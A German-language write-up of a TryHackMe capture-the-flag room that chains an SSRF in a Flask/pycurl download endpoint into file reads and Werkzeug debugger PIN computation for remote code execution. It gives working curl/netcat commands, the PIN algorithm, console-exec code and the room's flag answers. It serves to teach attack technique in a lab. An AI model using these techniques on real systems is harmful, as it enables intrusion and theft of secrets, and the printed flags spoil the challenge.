# PlantPhoto Hunt — TryHackMe Challenge

## Übersicht

Webseite eines Botanik-Fotografen (`http://<TARGET_IP>/`) — Flask + pycurl Backend auf Alpine Linux (Docker).  
Drei Flags über eine **SSRF-Schwachstelle** im `/download`-Endpoint extrahiert, bis hin zu **RCE über Werkzeug Debugger PIN-Bypass**.

## Flags

| # | Frage | Flag | Methode |
|---|-------|------|---------|
| 1 | API-Key des Secure Storage Service | `THM{Hello_Im_just_an_API_key}` | SSRF → Listener auf Attackbox |
| 2 | Flag in der Admin-Section | `THM{c4n_i_haz_flagz_plz?}` | SSRF → `http://127.0.0.1:8087/admin` |
| 3 | Flag in einer Textdatei im Web-Verzeichnis | `THM{SSRF2RCE_2_1337_4_M3}` | SSRF → Werkzeug PIN → RCE |

---

## Schritt-für-Schritt

### 1. Recon

```
Target: http://<TARGET_IP>/
Backend: Werkzeug/0.16.0 Python/3.10.7 (Flask + pycurl)
Debug-Modus: AN (debug=True)
```

Gefundene Endpoints:
- `/` — Homepage
- `/admin` — "Admin interface only available from localhost!!!"
- `/download?server=<host>&id=<num>` — SSRF-Schwachstelle
- `/public-docs-k057230990384293/<path>` — Statische Dateien
- `/console` — Werkzeug Interactive Debugger Console

### 2. Flag 1 — API-Key (SSRF → Listener)

Die App baut intern folgende URL:
```
http://{server}/public-docs-k057230990384293/{id}.pdf
```
und schickt den Request via **pycurl** mit einem `X-API-KEY` Header.

**Exploit:** `server` auf eigene Attackbox umleiten → Request mit Headers abfangen.

```bash
# Auf Attackbox: Listener starten
nc -lvnp 9999

# Dann triggern:
curl "http://<TARGET>/download?server=<ATTACKBOX_IP>:9999&id=1"
```

Der abgefangene Request enthält:
```
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**Skript:** `trigger_ssrf.py` / `capture.py`

### 3. Flag 2 — Admin Page (SSRF → Localhost)

`/admin` prüft `request.remote_addr == '127.0.0.1'`.  
Die App läuft intern auf **Port 8087**.  
Mit `%23` (URL-encoded `#`) wird der angehängte Pfad abgeschnitten.

```
curl "http://<TARGET>/download?server=http://127.0.0.1:8087/admin%23&id=1" --output flag.pdf
```

pycurl requested: `http://127.0.0.1:8087/admin#/public-docs.../1.pdf`  
→ Fragment wird ignoriert → `/admin` wird von localhost aufgerufen → `flag.pdf`

**Skript:** `get_admin_flag.py`

### 4. Source Code lesen (SSRF → file://)

pycurl unterstützt `file://` Protokoll. Mit `?` als Suffix wird der angehängte Pfad zum Query-Parameter:

```
curl "http://<TARGET>/download?server=file:///usr/src/app/app.py?&id=1"
```

Damit konnte der komplette Source Code (`app.py`), Dockerfile, `/proc/self/cgroup`, MAC-Adresse etc. gelesen werden.

### 5. Flag 3 — Textdatei (Werkzeug PIN → RCE)

Die Textdatei hat einen **randomisierten Dateinamen** (`flag-982374827648721338.txt`), daher war Brute-Force unmöglich. Lösung: **Werkzeug Debugger PIN berechnen** und über `/console` RCE erlangen.

#### 5a. Werkzeug 0.16.0 PIN-Berechnung

Benötigte Werte (alle via `file://` SSRF gelesen):

| Wert | Quelle | Beispiel |
|------|--------|---------|
| `username` | `/etc/passwd` / getpass | `root` |
| `modname` | Flask | `flask.app` |
| `appname` | Flask | `Flask` |
| `mod.__file__` | Traceback | `/usr/local/lib/python3.10/site-packages/flask/app.py` |
| `uuid.getnode()` | `/sys/class/net/eth0/address` | `02:42:ac:14:00:02` → `2485378088962` |
| `machine_id` | `/proc/self/cgroup` erste Zeile → Docker Container ID | `77c09e05c4a9...` |

**Algorithmus** (Werkzeug 0.16.0 — MD5):
```python
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit: continue
    if isinstance(bit, str): bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
```

> **Wichtig:** Werkzeug 0.16 `get_machine_id()` liest zuerst `/proc/self/cgroup` und extrahiert die Docker Container-ID via `.partition("/docker/")[2]`. Nur wenn kein Docker vorhanden ist, wird `/etc/machine-id` oder `boot_id` verwendet.

#### 5b. PIN eingeben + RCE

```python
session = requests.Session()
# Authentifizieren
session.get(f"{T}?__debugger__=yes&cmd=pinauth&pin={PIN}&s={SECRET}")
# Befehle ausführen über /console
session.get(f"{T}/console?__debugger__=yes&cmd={quote(cmd)}&frm=0&s={SECRET}")
```

```python
# Flag finden
>>> import os; print(os.listdir('/usr/src/app'))
['requirements.txt', 'Dockerfile', 'templates', 'public-docs', 'private-docs',
 'static', 'app.py', 'flag-982374827648721338.txt']

>>> print(open('/usr/src/app/flag-982374827648721338.txt').read())
THM{SSRF2RCE_2_1337_4_M3}
```

**Skript:** `full_exploit.py` → `console_exec.py` → `read_flag.py`

---

## Wichtige Skripte

| Skript | Zweck |
|--------|-------|
| `plant_hunt_api.py` | Recon + SSRF zu Listener (Flag 1) |
| `trigger_ssrf.py` | SSRF-Trigger mit Logging |
| `capture.py` | HTTP-Listener für Attackbox |
| `get_admin_flag.py` | SSRF → localhost:8087/admin (Flag 2) |
| `full_exploit.py` | All-in-one: Werte sammeln, PIN berechnen, Auth |
| `console_exec.py` | Commands über /console ausführen |
| `read_flag.py` | Flag-Textdatei lesen (Flag 3) |

## Voraussetzungen

```bash
pip install requests
```

## Lessons Learned

- **pycurl** unterstützt `file://`, `http://`, `dict://`, `gopher://` — jedes davon ist ein SSRF-Vektor
- `%23` (URL-encoded `#`) schneidet den Pfad bei pycurl ab
- Werkzeug Debug-Modus in Production = kritische Schwachstelle
- Werkzeug PIN ist **deterministisch** aus lesbaren Systemwerten berechenbar
- PIN-Exhaustion wird bei Maschinen-Neustart zurückgesetzt
